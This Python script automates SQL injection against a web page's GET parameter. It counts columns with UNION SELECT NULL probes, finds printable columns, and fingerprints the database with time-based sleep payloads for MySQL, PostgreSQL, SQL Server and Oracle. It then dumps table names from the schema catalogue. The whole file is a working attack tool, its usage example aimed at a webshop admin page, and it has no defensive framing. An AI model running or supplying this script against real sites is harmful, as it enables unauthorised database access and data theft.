import sys
import requests

def get_columns():
    for i in range(1, 30):
        query = ",".join(["NULL"] * (i))
        response = requests.get(f"{url}'+UNION+SELECT+{query}--+-")
        if response.status_code == 200:
            return i
    return -1

def find_printable_column_num():
    printable = []
    for i in range(0, num_columns):
        columns = [
            ",".join(["NULL"] * i),
            "'a'",
            ",".join(["NULL"] * (num_columns - 1 - i))
        ]
        columns = filter(None, columns)
        columns = ",".join(columns)

        response = requests.get(url + "'+UNION+SELECT+" + columns + "--+-").status_code
        if response == 200:
            printable.append(i)
    return printable

def enum_dbms():
    payloads = {
        "MySQL": "1' OR SLEEP(3) -- ",
        "PostgreSQL": "1'; SELECT pg_sleep(3) -- ",
        "Microsoft SQL Server": "1'; IF @@VERSION LIKE '%Microsoft%', WAITFOR DELAY '0:0:3' -- ",
        "Oracle": "1' AND DBMS_LOCK.SLEEP(3) -- "
    }

    for dbms, payload in payloads.items():
        response = requests.get(url + payload).elapsed.total_seconds()

        if response >= 3:
            return dbms

def send_query(payload):
    query = f"{url}+AND+1=0'+UNION+SELECT+*+FROM+({payload})+myquery--+-"
    print(query)
    return requests.get(query)

def get_tables():
    columns = prepare_columns("table_name")
    
    if dbms == "Oracle":
        return send_query(f"SELECT+{columns}+FROM+all_tables")
    elif dbms == "PostgreSQL" or dbms == "Microsoft SQL Server" or dbms == "MySQL":
        return send_query(f"SELECT+{columns}+FROM+information_schema.tables")
    else:
        return "Failed to enumerate table names"

def prepare_columns(mycolumn):
    r = [
        ",".join(["NULL"] * printable_column_num[0]),
        mycolumn,
        ",".join(["NULL"] * (num_columns - 1 - printable_column_num[0]))
    ]
    r = filter(None, r)
    return ",".join(r)

if len(sys.argv) < 2:
    print("Please provide a URL with GET-Parameter=")
    print("e.g: http://192.168.93.1/webshop/admin_users.php?s=")
    sys.exit(1)

url = sys.argv[1]
print("\nTesting connection")
if requests.get(url).status_code == 200:
    print("Connection...ok")
else:
    print("Connection...failed")
    sys.exit(1)

print("Checking for Basic Union Query injection")
print("\nTesting SQL columns")
num_columns = get_columns()
printable_column_num = find_printable_column_num()
print(f"Columns_num: {num_columns}")
print(f"Printable column_num: {printable_column_num}")
dbms = enum_dbms()
print(f"The web application is running {dbms}.")
print(get_tables().text)
